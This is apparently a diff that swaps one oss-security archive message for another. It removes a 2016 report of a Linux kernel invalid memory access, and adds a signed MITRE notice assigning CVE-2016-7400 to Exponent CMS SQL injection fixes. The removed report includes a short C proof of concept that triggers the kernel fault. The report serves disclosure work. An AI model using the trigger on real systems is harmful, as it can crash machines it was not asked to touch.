@@ -1,51 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/11/2
-Message-ID: <CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>
-Date: Tue, 11 Oct 2016 22:22:48 +0800
-From: Marco Grassi <marco.gra@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: linux kernel do_blockdev_direct_IO invalid memory access
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/10
+Message-Id: <20160918170654.46FF36C5824@smtpvmsrv1.mitre.org>
+Date: Sun, 18 Sep 2016 13:06:54 -0400 (EDT)
+From: cve-assign@...re.org
+To: felixk3y@...il.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-I posted this to ask feedback on security at kernel dot org, but I think my
-mail got bounced back. Not sure if from the mailing list or from some
-single recipient.
+> 1)
+> https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/addressbook/controllers/addressController.php#L166-L175
+> 
+> 2)
+> https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/blog/controllers/blogController.php#L192-L195
+> 
+> 3)
+> https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/core/controllers/expCommentController.php#L129-L134
+> 
+> https://github.com/exponentcms/exponent-cms/commit/e916702a91a6342bbab483a2be2ba2f11dca3aa3
 
-Anyway reposting here,
+Use CVE-2016-7400 for all of the SQL injection issues fixed in
+e916702a91a6342bbab483a2be2ba2f11dca3aa3.
 
-the following program will cause a invalid memory access
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-BUG: KASAN: wild-memory-access on address 0005080000000000
-
-See this link for the full sanitizer report, stacktrace and trigger poc
-
-https://gist.github.com/marcograss/40850adb3c599ac38e0beac31617d56b
-
-tested on current master, with KASAN.
-
-Marco
-
----
-
-#include <sys/syscall.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#define _GNU_SOURCE
-#include <fcntl.h>
-#include <sys/sendfile.h>
-
-int main()
-{
-  int ret = 0;
-  int fd = open("./hurrdurr", O_APPEND|O_RDWR|0x40);
-  ret = fcntl(fd, 4, 0x44000, 0, 0, 0);
-  ret = fallocate(fd, 0, 0x21, 0xafa6);
-  off_t offset = 0;
-  ret = sendfile(fd, fd, &offset, 0x800);
-  return 0;
-}
-
+iQIcBAEBCAAGBQJX3shoAAoJEHb/MwWLVhi2SKgP/0ROz868/9VNunPODC3o0SNo
+DH/VdQ0h1DRDwWBA4R1Lc16Qlsee4m8gInD+8e0LtKWc07OMzg+VqHICTdW3COUd
+Cd+nXTMRmr9T/TIsvfN/tEch23o36/z4d1kA9QDgODELvNW3EsQXwDePMlWbRi80
+7u2Y6uf7gshQmq95fSlsbawkj+0813X5XvCxX22wXZWGCQhlAP9ejxv1Q+Z4qbyu
+JEY5DXYubfEjXsv1AIKyoiAGSGesO3MeXoGXYnPFd8V18NJNZiz4xHe0hurYVhuH
+LNBnsZKO7whSciiUgcXKopbzkKloMEVEdHlu+HZ63eALvMWcKxQrxGlcKTVBWcOs
+CKUlsTjnD7liEZk46HIiVVSUFLnxCR/Q3koR0tgfBRNJQ9zpoMxNwxFKEi0366/Y
+MHDYKuYUvefMTDQJhtVYYNANCC+LQxdeBwfQsVFZnp/2JbCGDs5OSlUwl7WFTVh2
+nI7kF8lqUpDIni5VhYAniEUedGToFMgusDQaWCLWV34Tyhm5XfGn7bMZVr3HLPn9
+wTsfRJnItjgerHSpnezcSc+i4dALBINpjxYyqJCbRMmIx/pwlI77W/fShgXq6VLh
+0eJmP32P3sRV+sGYYphMSUQuyA9Lv3YA9oEuct1/gcGyQDzqhd1HklhbX2/UpykW
+ftRu2RktzIYSf/3CC5oL
+=rC1I
+-----END PGP SIGNATURE-----
